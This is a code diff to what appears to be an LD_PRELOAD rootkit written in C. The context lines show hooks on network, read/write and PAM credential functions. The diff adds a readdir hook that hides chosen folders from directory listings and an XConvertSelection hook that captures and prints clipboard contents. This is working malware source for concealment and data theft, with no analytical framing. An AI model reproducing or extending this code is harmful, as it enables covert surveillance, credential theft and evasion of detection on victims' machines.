@@ -19,9 +19,10 @@
 #include <security/pam_appl.h>
 #include "utils/obfuscate.h"
 #include "utils/config.h"
-
 #include <stdint.h>
 #include <inttypes.h>
+#include <dirent.h>
+#include <X11/Xlib.h>
 
 
 static int (*original_getaddrinfo)(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res);
@@ -45,10 +46,8 @@ static ssize_t (*original_write)(int fd, const void *buf, size_t count);
 static ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 #define PAM_SUCCESS 0
-
 #define PAM_SERVICE 1
 #define PAM_AUTHTOK 6
-
 #define PAM_RHOST 4
 #define PAM_USER 2
 
@@ -80,6 +79,53 @@ bool is_heap_var(void* pointer){
         return true;
     }
     return false;
+}
+
+
+// hide folders
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*real_readdir)(DIR *);
+    real_readdir = dlsym(RTLD_NEXT, "readdir");
+
+    struct dirent *entry;
+    while ((entry = real_readdir(dirp)) != NULL) {
+        if (strcmp(entry->d_name, (char*)*HIDDEN_FOLDERS) == 0) {
+            continue;  
+        }
+        return entry;  
+    }
+
+    return NULL;  
+}
+
+
+// get clipboard content
+int XConvertSelection(Display* display, Atom selection, Atom target, Atom property, Window requestor, Time time) {
+    int ret = -1;
+
+
+    int (*original_XConvertSelection)(Display*, Atom, Atom, Atom, Window, Time);
+    original_XConvertSelection = dlsym(RTLD_NEXT, "XConvertSelection");
+    ret = (*original_XConvertSelection)(display, selection, target, property, requestor, time);
+
+    if (ret != 0) {
+        char* clipboard_data = NULL;
+        Atom actual_type;
+        int actual_format;
+        unsigned long nitems;
+        unsigned long bytes_after;
+        ret = XGetWindowProperty(display, requestor, property, 0, 0x7fffffff, False, AnyPropertyType,
+                                 &actual_type, &actual_format, &nitems, &bytes_after, (unsigned char**)&clipboard_data);
+
+
+        if (clipboard_data != NULL) {
+            printf("Conteúdo do clipboard: %s\n", clipboard_data);
+        }
+
+        XFree(clipboard_data);
+    }
+
+    return ret;
 }
 
 // file content tampering
